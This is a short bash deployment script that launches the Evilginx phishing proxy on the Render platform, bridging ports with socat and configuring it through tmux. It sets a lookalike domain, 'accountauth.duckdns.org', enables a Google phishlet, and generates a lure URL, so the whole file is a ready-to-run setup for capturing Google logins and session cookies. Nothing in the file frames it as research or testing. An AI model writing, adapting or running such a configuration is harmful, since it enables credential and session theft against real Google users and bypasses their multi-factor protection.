#!/bin/bash

# 1. Bridge Render's dynamic port to Evilginx's port 80
socat TCP-LISTEN:${PORT:-8080},fork TCP:127.0.0.1:80 > /dev/null 2>&1 &

# 2. Start Evilginx inside a detached tmux session
tmux new-session -d -s evilginx '/app/evilginx -p /app/phishlets'

# 3. Wait for Evilginx to boot up
sleep 5

# 4. Send the configuration commands into the tmux session
tmux send-keys -t evilginx "config domain accountauth.duckdns.org" Enter
tmux send-keys -t evilginx "config ipv4 external 127.0.0.1" Enter
tmux send-keys -t evilginx "phishlets hostname google accountauth.duckdns.org" Enter
tmux send-keys -t evilginx "phishlets enable google" Enter
tmux send-keys -t evilginx "lures create google" Enter
tmux send-keys -t evilginx "lures get-url 0" Enter

# 5. Attach to the tmux session and stream the logs to Render
# This ensures you can see the Evilginx logs in the Render dashboard
tmux pipe-pane -t evilginx -o 'cat'
tmux attach-session -t evilginx
